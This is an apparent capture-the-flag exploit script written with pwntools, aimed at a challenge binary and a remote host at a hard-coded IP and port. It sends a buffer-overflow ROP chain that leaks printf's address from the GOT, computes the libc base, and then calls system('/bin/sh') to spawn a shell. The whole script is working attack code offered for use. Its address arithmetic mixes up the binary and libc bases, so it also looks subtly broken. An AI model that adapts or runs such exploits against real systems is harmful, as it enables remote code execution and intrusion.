#!/usr/bin/python3
from pwn import *
import argparse

# ===========================================================
#                    SETUP FUNCTIONS
# ===========================================================

def print_message():
    cDFL = "\033[0m"
    cBLK = "\033[1;30m"
    cRED = "\033[1;31m"
    cGRN = "\033[1;32m"
    cYLW = "\033[1;33m"
    cBLU = "\033[1;34m"

    text = """
┌───────────────────────────────┐
│        RUNNING EXPLOIT        │
│                               │"""

    if (args.debug):
        text += f"""
│  DEBUGGING   {cGRN}ENABLED{cDFL}          │"""
    else:
        text += f"""
│  DEBUGGING   {cRED}DISABLED{cDFL}         │"""

    if (args.interactive):
        text += f"""
│  INTERACTIVE {cGRN}ENABLED{cDFL}          │"""
    else:
        text += f"""
│  INTERACTIVE {cRED}DISABLED{cDFL}         │"""

    if (args.gdb):
        text += f"""
│  RUNNING     {cYLW}GDB{cDFL}              │
└───────────────────────────────┘
"""
    elif (args.remote):
        text += f"""
│  RUNNING     {cBLU}REMOTE EXPLOIT{cDFL}   │
└───────────────────────────────┘
"""
    else:
        text += f"""
│  RUNNING     {cBLK}LOCAL EXPLOIT{cDFL}    │
└───────────────────────────────┘
"""

    print(text)

def initIO():
    print_message()
    if (args.debug):
        context.log_level = "debug"

    if (args.gdb):
        return pwnlib.gdb.attach(elf.process(), gdbscript=script)
    if (args.remote):
        return remote(server, port)
    return elf.process()

top_parser = argparse.ArgumentParser()

running = top_parser.add_mutually_exclusive_group()
running.add_argument("-g", "--gdb", action="store_true", dest="gdb", help="connect to gdb")
running.add_argument("-r", "--remote", action="store_true", dest="remote", help="connect to remote")
running.add_argument("-l", "--local", action="store_true", dest="local", help="connect to local", default=True)

top_parser.add_argument("-d", "--debug", action="store_true", dest="debug", default=False, help="enable/disable debugging")
top_parser.add_argument("-i", "--interactive", action="store_true", dest="interactive", default=False, help="enable/disable interactive")
args = top_parser.parse_args()

# ===========================================================
#                       CONFIG SETUP
# ===========================================================

# LOCAL
file = "./chall"
libc = "./libc.so.6"
if (file != ""):
    elf = context.binary = ELF(file, checksec=False)
if (libc != ""):
    libc = ELF(libc, checksec=False)

libc = elf.libc

# REMOTE
server = "34.101.174.85"
port = 10007

# GDB
context.terminal = "kitty"
script = """

"""

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = initIO()

offset = 9

POP_RDI = next(elf.search(asm('pop rdi ; ret')))

payload = flat(
    b'A' * offset,
    POP_RDI,
    elf.got['printf'],
    elf.plt['printf'],
    elf.sym['main']
)

print('Sending 1st payload')
io.sendline(payload)

io.recvuntil(b'> ')
printf_leak = u64(io.recv(6) + b'\x00\x00')

print(f"printf leak: {printf_leak:x}")

elf.address = printf_leak - libc.sym['printf']
print(f"elf address: {elf.address:x}")

SYSTEM = elf.address + libc.sym['system']
BINSH = elf.address + next(libc.search(b'/bin/sh'))

print(f"binsh: {BINSH:x}")
print(f"system: {SYSTEM:x}")

payload = flat(
    b'A' * offset,
    POP_RDI + 1,
    POP_RDI,
    BINSH,
    SYSTEM,
    0x0
)

pause()

print('Sending 2nd payload')
io.sendline(payload)

if (args.interactive):
    io.interactive()
